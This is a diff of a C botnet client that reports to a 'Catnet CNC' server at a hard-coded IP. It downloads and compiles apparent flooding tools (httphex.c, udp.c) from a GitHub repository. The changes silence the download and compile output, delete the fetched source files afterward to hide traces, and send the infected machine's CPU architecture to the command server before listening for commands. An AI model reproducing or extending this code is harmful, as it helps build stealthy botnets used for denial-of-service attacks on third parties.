@@ -9,6 +9,7 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <sys/utsname.h> 
 
 #define SECRET_STRING "cat123"
 #define SERVER_IP "51.38.82.23"
@@ -16,10 +17,12 @@
 #define BUFFER_SIZE 1024
 
 void download_files() {
-    system("curl https://raw.githubusercontent.com/bobjohnmarley123/dog/main/httphex.c -o httphex.c");
-    system("curl https://raw.githubusercontent.com/bobjohnmarley123/dog/main/udp.c -o udp.c");
-    system("gcc httphex.c -o httphex -pthread");
-    system("gcc udp.c -o udp -pthread");
+    system("curl -s https://raw.githubusercontent.com/bobjohnmarley123/dog/main/httphex.c -o httphex.c > /dev/null 2>&1");
+    system("curl -s https://raw.githubusercontent.com/bobjohnmarley123/dog/main/udp.c -o udp.c > /dev/null 2>&1");
+    system("gcc httphex.c -o httphex -pthread > /dev/null 2>&1");
+    system("gcc udp.c -o udp -pthread > /dev/null 2>&1");
+    system("rm udp.c");
+    system("rm httphex.c");
 }
 
 
@@ -69,12 +72,23 @@ int main() {
         perror("Error connecting to server");
         exit(1);
     } else {
-        printf("Connected to server %s:%d\n", SERVER_IP, SERVER_PORT);
+        printf("Connected to Catnet CNC.\n");
     }
 
     // Send the secret string as UTF-8 encoded bytes
     send(client_socket, SECRET_STRING, strlen(SECRET_STRING), 0);
     printf("Sent secret string to server\n");
+
+    // Get the CPU architecture
+    struct utsname uname_data;
+    if (uname(&uname_data) == -1) {
+        perror("Error getting system information");
+        exit(1);
+    }
+
+    // Send the CPU architecture to the server
+    send(client_socket, uname_data.machine, strlen(uname_data.machine), 0);
+    printf("Sent CPU architecture to server: %s\n", uname_data.machine);
 
     pthread_t listen_thread;
     pthread_create(&listen_thread, NULL, listen_for_commands, &client_socket);
